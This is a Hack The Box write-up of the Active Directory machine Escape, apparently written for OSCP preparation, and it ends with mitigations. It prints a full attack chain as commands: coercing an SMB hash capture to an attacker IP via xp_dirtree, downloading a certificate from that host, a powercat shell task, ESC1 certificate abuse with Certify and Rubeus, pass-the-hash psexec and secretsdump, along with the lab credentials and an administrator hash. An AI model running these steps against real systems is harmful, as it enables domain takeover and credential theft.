---
title: Escape
date: 2025-04-20
categories: [oscp, HTB]
tags: [oscp-preparation, walkthrough, HTB] 
image: escape.png
media_subpath: /assets/img/posts/2025-04-20-escapeHTB/
---
## Introduction
In this walkthrough we will be solving Hack The Box Intermediate Active Directory Windows box Escape. Let’s start ..

## Nmap

### TCP

Run a quick Nmap scan:

```bash
sudo nmap -sV $IP --open
```

![image.png](image.png)

### UDP

Check top 100 UDP ports:

```bash
sudo nmap -sU -F $IP
```

![image.png](image%201.png)

No valuable UDP ports open.

### Full Port scan

```bash
sudo nmap -sV -sC -p- $IP -Pn -n --open -v
```

> Add domain to `/etc/hosts` file:
![image.png](image%203.png)
{: .prompt-warning }


I noticed 8 hours skew in Nmap output which means we should synchronize our clock with the target machine clock to perform Kerberos related actions, as maximum allowable clock skew in Kerberos may be 5 minutes, this prevents replay attacks in protocol.

![image.png](image%202.png)

We can sync our clocks with the following command:

```bash
sudo apt install ntpdate
sudo ntpdate dc.sequel.htb
```

## Services

### Port 53

**Domain: sequel.htb**

- dig any DNS records, maybe there is something in TXT records.

```bash
dig any sequel.htb @$IP
```

![image.png](image%204.png)

- Zone Transfer

```bash
dig axfr @$IP sequel.htb
```

![image.png](image%205.png)

### Port 139/445

Checking available shares:

```bash
smbclient -L //$IP/ -N
```

![image.png](image%206.png)

- **Public share**
    
    Under public share I found pdf file `SQL Server Procedures.pdf`
    
    From non-domain joined host:
    
    ```bash
    cmdkey /add:"<serverName>.sequel.htb" /user:"sequel\<userame>" /pass:<password>
    ```
    
    For new hired and those that are still waiting their users to be created and perms assigned, can sneak a peek at the Database with
    user `PublicUser` and password `GuestUserCantWrite1`
    
    Refer to the previous guidelines and make sure to switch the "Windows Authentication" to "SQL Server Authentication".
    

### Port 1433

Microsoft SQL Server 2019 15.00.2000

Connecting MSSQL with:

```bash
mssqlclient.py sequel.htb/PublicUser:GuestUserCantWrite1@dc.sequel.htb
```

We can see databases using the following command:

```sql
SELECT * FROM master.dbo.sysdatabases;
```

There are 4 databases on the target which are just default databases:

![image.png](image%207.png)

Which means we should search for other way of exploitation:

- Product  version : 10.0.17763 - **no public exploits found.**
- Command Execution is **not allowed**
    
    ```sql
    xp_cmdshell whoami
    ```
    
    ![image.png](image%208.png)
    
    Trying to enable it returns error:
    
    ```sql
    EXECUTE sp_configure 'show advanced options', 1
    ```
    
    ![image.png](image%209.png)
    
- Capturing **sql_svc hash**

```bash
sudo impacket-smbserver share ./ -smb2support
```

```bash
exec xp_dirtree '\\10.10.14.6\share\', 1, 1
```
![image.png](image%2010.png)

Checking connection with netxec:

```bash
sudo nxc smb $IP -u sql_svc -d sequel.htb -p REGGIE1234ronnie --shares
```

![image.png](image%2011.png)

## AD Initial Enumeration

### User Enumeration

brandon.brown@sequel.htb

### Port 389/3268

…

## Exploitation

Getting shell using evil-winrm:

```bash
evil-winrm -i $IP -u sql_svc@sequel.htb -p REGGIE1234ronnie

```

![image.png](image%2012.png)

I went to SQLServer folder and found there Logs, where **errorlog.bak** was found, I read it and saw that user Ryan tried to login to the server but I suppose mistyped something and used his password as username after he entered his username that way I made a guess and used the username and password and got access as Ryan.

![image.png](image%2013.png)

```bash
evil-winrm -i $IP -u Ryan.Cooper@sequel.htb -p NuclearMosquito3
```

![image.png](image%2014.png)

## Privilege Escalation

- **SeMachineAccountPrivilege**
    
    I tried leveraging SeMachineAccountPrivilege so I executed `systeminfo` but it seems we don’t have access for that:
    
    ![image.png](image%2015.png)
    
    So I found this information from ERRORLOG.BAK we investigated before:
    
    ![image.png](image%2016.png)
    
    Then I just run this attack:
    [SamAccountNameSpoofing](https://www.hackingarticles.in/windows-privilege-escalation-samaccountname-spoofing/)
    
    ![image.png](image%2017.png)
    
- **OSCP Checklist**
    - [ ]  Situational Awareness
    - [ ]  SeImpersonatePrivilege 
    - [ ]  SeBackupPrivilege 
    - [ ]  SeDebugPrivilege
    - [ ]  SeRestorePrivilege 
    - [ ]  SeTakeOwnershipPrivilege
    - [ ]  SeManageVolumePrivilege 
    - [ ]  SeMachineAccountPrivilege 
    - [ ]  [Full Privileges](https://itm4n.github.io/localservice-privileges/?source=post_page-----b95d3146cfe9---------------------------------------)
    - [ ]  [FullPowers](https://github.com/itm4n/FullPowers) - second way of obtaining full privileges
    - [ ]  PowerShell History(Transcription, Script Logging) 
    - [ ]  Sensitive Files 
    - [ ]  Insecure Service Executables 
    - [ ]  binpath 
    - [ ]  DLL hijacking 
    - [ ]  Unquoted Service Path 
    - [ ]  Scheduled Tasks 
    - [ ]  Application-based exploits 
    - [ ]  Detailed Paper about other privileges [https://github.com/hatRiot/token-priv](https://github.com/hatRiot/token-priv)
    - [ ]  Kernel Exploits 
    - [ ]  When you're on a Windows box make sure to check the root directory of the local drive volume, each user directory as well as their Desktop and Documents folders, the Program Files folder (usually the x86 one), as well as their PowerShell history if you want to be extra thorough. Do these before using something like winPEAS to save time if you end up finding a config file or script with credentials in it.
    
- **sql_svc full privileges**

I tried gaining full privileges of sql_svc service account:

1. [Full Privileges](https://itm4n.github.io/localservice-privileges/?source=post_page-----b95d3146cfe9---------------------------------------) - didn’t work
    
    ```powershell
    $TaskAction = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-Exec Bypass -Command `". C:\new\powercat.ps1; powercat -l -p 7002 -ep`""
    ```
    
2. [FullPowers](https://github.com/itm4n/FullPowers) - didn’t work
    
    ![image.png](image%2018.png)
    
- **Running winpeas**

  ![image.png](image%2019.png)
  Nothing useful.
### ADCS

As we have seen many certificate related signs and a CA , and also box is called Escape(ESC), we can think of Certificates Services vulnerabilities.

```bash
sudo nxc ldap $IP -u ryan.cooper -p NuclearMosquito3 -M adcs
```

![image.png](image%2020.png)

**Finding Vulnerabilities:**

```bash
.\Certify.exe find /vulnerable /currentuser
```

![image.png](image%2021.png)

This certificate template is vulnerable because `sequel\Domain Users` have Enrollment rights on the template.

Reading [README.md](https://github.com/GhostPack/Certify/blob/main/README.md) of certify.exe we can see:

![image.png](image%2022.png)

Next, let's request a new certificate for this template/CA, specifying a DA `administrator` as the alternate principal:

```bash
.\Certify.exe request /ca:dc.sequel.htb\sequel-DC-CA /template:UserAuthentication /altname:administrator

```

Here we got the key:

![image.png](image%2023.png)
_Key is truncated in the image, let’s now continue reading README file._

Copy the  `-----BEGIN RSA PRIVATE KEY----- ... -----END CERTIFICATE-----` section to a file on Linux/macOS, and run the openssl command to convert it to a .pfx. When prompted, don't enter a password:
Finally, move the cert.pfx to your target machine filesystem (manually or through Cobalt Strike), and request a TGT for the `altname` user using Rubeus:

```bash
iwr -uri http://10.10.14.6/cert.pfx -Outfile cert.pfx
```

```bash
.\Rubeus.exe asktgt /user:administrator /certificate:C:\users\ryan.cooper\cert.pfx
```

![image.png](image%2024.png)

- The `asktgt` command in `Rubeus` **requests a TGT** using the **certificate (PKINIT)** and **exports it to a file**, but it **does not inject** it into the current session by default.
- That means the ticket is saved as a `.kirbi` file (base64-encoded), but **your current session doesn’t have it loaded into memory**, so `klist` (which checks the Kerberos cache) doesn't see it.

It returned base64 ticket, but we need it in current session so let’s instruct Rubeus.exe save ticket in `.kirbi` file and then we are gonna load it into current session with Rubeus.exe

```bash
.\Rubeus.exe asktgt /user:administrator /certificate:C:\users\ryan.cooper\cert.pfx /outfile:C:\Users\Ryan.Cooper\tgt.kirbi
```

```bash
.\Rubeus.exe ptt /ticket:C:\Users\ryan.cooper\tgt.kirbi
```

```powershell
klist
```

Now we can see ticket is loaded into current session:

![image.png](image%2025.png)

- You have a **TGT for `administrator@SEQUEL.HTB`**.
- That ticket is valid and was issued by the **KDC (Domain Controller)**.

But as we don’t have TGS ticket we can’t access Administrator folders and files. 

```bash
.\Rubeus.exe asktgt /user:administrator /certificate:C:\users\ryan.cooper\cert.pfx /getcredentials
```

Let’s then request credentials with `/getcredentials` option

![image.png](image%2026.png)

Using this hash and psexec we can get nt authority\ system shell:

```bash
impacket-psexec Administrator@$IP -hashes :A52F78E4C751E5F5E17E1E9F3E58F4EE
```

![image.png](image%2027.png)

As we have a hash of the administrator user we can dump domain hashes using secretsdump with hash authentication:

```bash
secretsdump.py sequel/administrator@$IP -hashes A52F78E4C751E5F5E17E1E9F3E58F4EE
```

It dumped SAM database for local users, LSA secrets, even showed cleartext password for sql_svc account, then dumped NTDS.dit file:

![image.png](image%2028.png)

## Credentials

```bash
PublicUser : GuestUserCantWrite1 # Database Credentials for new hired
sql_svc : REGGIE1234ronnie
Ryan.Cooper : NuclearMosquito3
Administrator : A52F78E4C751E5F5E17E1E9F3E58F4EE
```

## Additional Section

BUT I cannot access Admin user directories with this ticket:

<aside>
❗

It should have requested TGS and given access to directories by itself, but it seems this just didn’t happen.

</aside>

![image.png](image%2029.png)

Listing SPNs:

```powershell
setspn -L dc$
```

![image.png](image%2030.png)

> If a service does not have a **Service Principal Name (SPN)** registered in Active Directory, you **cannot request a Ticket-Granting Service (TGS) ticket** from the Kerberos Key Distribution Center (KDC) for that service, even if you have a valid **Ticket-Granting Ticket (TGT)** for an Administrator account.
{: .prompt-warning }


I saw `HOST/dc.sequel.htb` which is oftentimes SPN  that encompasses  SMB, RPC and so on.

So I tried requesting TGS ticket for that SPN:

First set `/etc/krb5.conf` file:

```bash
[libdefaults]
default_realm = SEQUEL.HTB
kdc_timesync = 1
ccache_type = 4
forwardable = true
proxiable = true
[realms]
SEQUEL.HTB = {
kdc = dc.sequel.htb
admin_server = dc.sequel.htb
}
[domain_realm]
.sequel.htb = SEQUEL.HTB
sequel.htb = SEQUEL.HTB
```

**Requesting TGS ticket:**

**>> Windows**

```bash
.\Rubeus.exe asktgs /ticket:admin.kirbi /service:HOST/dc.sequel.htb /dc:dc.sequel.htb /ptt
```

![image.png](image%2031.png)

But again I cannot access `C$` share.
```powershell
dir \\dc.sequel.htb\C$
```
**>> Linux**

I used `/outfile` option of Rubeus and saved kirbi ticket in a file, then transferred over Linux machine and converted to `.ccache` file using impactet-ticketConverter

```bash
impacket-ticketConverter ticket.kirbi ticket.ccache
```

Then I set `KRB5CCNAME` environment variable to that ccache file:

```bash
export KRB5CCNAME=$PWD/ticket.ccache
```

Then I tried requesting TGS for HOST SPN from Linux:

<aside>
💡

We can only use the TGT on the machine it was created for, but the TGS potentially offers more flexibility.

</aside>

```bash
kvno HOST/dc.sequel.htb
```

But for some reason this didn’t work, then I decided to make a ready TGS ticket in Windows and transfer that TGS ticket already in ready format to Linux, I did that and after that I tried authenticating with psexec:

```bash
impacket-psexec -k -dc-ip $IP SEQUEL.HTB/administrator@dc.sequel.htb
```

![image.png](image%2032.png)

This also didn’t work.

**Possible reasons of a problem:**

- **UAC Restrictions**: UAC might be filtering your Administrator token, reducing your privileges for remote SMB access.
    
    I tried spawning a new cmd where network authentication will be handled with my Kerberos ticket. This will authenticate as administrator@SEQUEL.HTB using the TGT, potentially bypassing issues like UAC filtering that might affect your main session. Additionally, the new session isolates network authentication, which can be useful for testing or avoiding conflicts with other processes.
    
    ```powershell
    Rubeus.exe createnetonly /program:"C:\Windows\System32\cmd.exe" /show
    ```
    
    But of course with this kind of shell it wouldn’t be possible.
    
- **Policy Restrictions**: A Group Policy might be blocking access to administrative shares for remote connections.
- **TGT ≠ Local Privileges**
    
    A **TGT only proves your identity to the domain controller** — it does **not** automatically give you local administrator rights on a target machine.
    
## Mitigation

- Restrict unauthenticated access to SMB shares and avoid placing sensitive files or credentials in publicly accessible locations.
- Ensure sensitive documents do not contain plaintext or temporary credentials.
- Configure MSSQL servers to prevent outbound NTLM authentication (e.g., using firewalls or GPO settings like `RestrictOutboundNTLMTraffic`).
- Enforce strong, complex passwords across all accounts to reduce the chance of successful hash cracking.
- Limit WinRM access to specific administrative users and monitor access logs for suspicious activity.
- Regularly audit and harden Active Directory Certificate Services (AD CS) to ensure templates cannot be abused by low-privileged users (e.g., ESC1 vulnerabilities).
- Disable or secure any certificate templates that allow `ENROLLEE_SUPPLIES_SUBJECT` or do not enforce manager approval.
- Apply least privilege principles to user permissions, especially those related to certificate enrollment and domain privilege escalation paths.
